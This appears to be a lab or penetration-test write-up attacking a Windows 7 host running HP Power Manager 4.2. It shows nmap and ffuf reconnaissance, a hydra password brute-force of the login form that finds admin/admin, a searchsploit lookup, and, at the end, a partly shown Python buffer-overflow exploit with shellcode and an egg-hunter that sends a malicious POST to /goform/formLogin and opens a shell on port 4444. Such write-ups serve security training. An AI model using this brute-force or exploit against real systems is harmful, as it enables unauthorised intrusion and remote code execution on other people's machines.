# target: 192.168.71.45

# reconnaissance

```bash
nmap 192.168.71.45 -p- --open -Pn -O -sV -sC -oN nmap.txt
```

```
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-14 07:41 +0000
Nmap scan report for 192.168.71.45
Host is up (0.00042s latency).
Not shown: 54466 closed tcp ports (reset), 11057 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
80/tcp    open  http         GoAhead WebServer
|_http-title: Did not follow redirect to http://192.168.71.45/index.asp
|_http-server-header: GoAhead-Webs
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| rdp-ntlm-info:
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-11-14T07:42:53+00:00
|_ssl-date: 2026-11-14T07:43:08+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2026-11-13T07:16:29
|_Not valid after:  2027-05-15T07:16:29
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.991%E=4%D=11/14%OT=80%CT=1%CU=37341%PV=Y%DS=2%DC=I%G=Y%TM=6AF81
OS:10D%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=I%TS=7)SEQ(SP=102%
OS:GCD=1%ISR=10A%TI=I%TS=7)SEQ(SP=105%GCD=1%ISR=109%TI=I%TS=7)SEQ(SP=105%GC
OS:D=1%ISR=10A%TI=I%II=I%SS=S%TS=7)SEQ(SP=108%GCD=1%ISR=10B%TI=I%TS=7)OPS(O
OS:1=M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=M5B4NW8ST
OS:11%O6=M5B4ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R
OS:=Y%DF=Y%T=80%W=2000%O=M5B4NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=B1
OS:C2A1A3%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:dc:b9 (VMware)
| smb-os-discovery:
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-11-13T23:42:53-08:00
|_clock-skew: mean: 1h35m59s, deviation: 3h34m39s, median: 0s
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-11-14T07:42:54
|_  start_date: 2026-11-14T07:17:21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.96 seconds

```

```bash
ffuf -u http://192.168.71.45:80/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

```txt


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.71.45:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cgi-bin-church          [Status: 200, Size: 200, Words: 13, Lines: 5, Duration: 0ms]
cgi-bin                 [Status: 200, Size: 193, Words: 13, Lines: 5, Duration: 1ms]
cgi-bin-debug           [Status: 200, Size: 199, Words: 13, Lines: 5, Duration: 1ms]
cgi-bin/                [Status: 200, Size: 209, Words: 16, Lines: 5, Duration: 0ms]
cgi-bin2                [Status: 200, Size: 194, Words: 13, Lines: 5, Duration: 0ms]
cgi-bin-live            [Status: 200, Size: 198, Words: 13, Lines: 5, Duration: 1ms]
cgi-bin_ssl             [Status: 200, Size: 197, Words: 13, Lines: 5, Duration: 1ms]
contents                [Status: 302, Size: 211, Words: 17, Lines: 6, Duration: 1ms]
nul                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
:: Progress: [20481/20481] :: Job [1/1] :: 32 req/sec :: Duration: [0:00:10] :: Errors: 339 ::

```

## subdoamin

```bash
ffuf -u http://192.168.71.45:80 -H "Host:FUZZ.192.168.71.45" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 302
```

```txt


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.71.45:80
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.192.168.71.45
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

:: Progress: [151265/151265] :: Job [1/1] :: 56 req/sec :: Duration: [0:01:02] :: Errors: 8752 ::

```

> http://192.168.71.45/index.asp
> HP Power Manager login page

![HP Power Manager login page](https://github.com/user-attachments/assets/5992ee52-d7f5-4e79-87f2-3c302df9f5c1)

> POST

![POST request](https://github.com/user-attachments/assets/dd1b487e-9966-43bc-8321-a366026d9b14)

```txt
POST /goform/formLogin HTTP/1.1
Host: 192.168.71.45
Content-Length: 68
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: http://192.168.71.45
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.71.45/index.asp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

HtmlOnly=true&Login=admin&Password=password&loginButton=Submit+Login
```

![login form POST details](https://github.com/user-attachments/assets/b6bc3eb4-ca6e-44e5-a948-607addc48362)

```bash
hydra -V -F -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 192.168.71.45 http-post-form "/goform/formLogin:HtmlOnly=true&Login=^USER^&Password=^PASS^&loginButton=Submit+Login:Invalid"
```

![hydra cracking result](https://github.com/user-attachments/assets/7423d109-8609-4800-8c65-9f1500233381)

> admin/admin
> http://192.168.71.45/Contents/index.asp

![admin/admin login success](https://github.com/user-attachments/assets/b1ad81c8-ce6e-4d68-b573-41d44c474971)

> No exists Header Token
> I doubt the IP based trust machanism

![No Header Token](https://github.com/user-attachments/assets/5b13854b-45df-4dfc-8a97-8eb2f9fd7d3f)

> HP Power Manager 4.2 (build 7)
> ![HP Power Manager 4.2](https://github.com/user-attachments/assets/6bb8f755-bb01-4262-8841-793236f3a428)

```bash
# update exploit db
sudo searchsploit -u
```

```bash
sudo searchsploit power manager
```

```
 Exploit Title                                                          |  Path
ApowerManager 3.1.7 - Phone Manager Remote Denial of Service (PoC)      | android/dos/46380.py
Drive Power Manager 1.10 - Denial Of Service (PoC)                      | windows_x86/dos/45299.py
Eaton Intelligent Power Manager 1.6 - Directory Traversal               | hardware/webapps/48614.txt
Flying Dog Software Powerslave 4.3 Portalmanager - 'sql_id' Information | php/webapps/23163.txt
Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overf | windows/remote/16785.rb
Hewlett-Packard (HP) Power Manager Administration Power Manager Adminis | windows/remote/10099.py
HP Power Manager - 'formExportDataLogs' Remote Buffer Overflow (Metaspl | cgi/remote/18015.rb
NPM-V (Network Power Manager) 2.4.1 - Password Reset                    | hardware/webapps/42933.txt
```

```py
\x56"
"\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x36"
"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x58\x47\x45\x4e\x4f"
"\x43\x58\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
"\x4a\x36\x4f\x4e\x50\x4c\x42\x4e\x42\x56\x43\x45\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a")

EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()
```
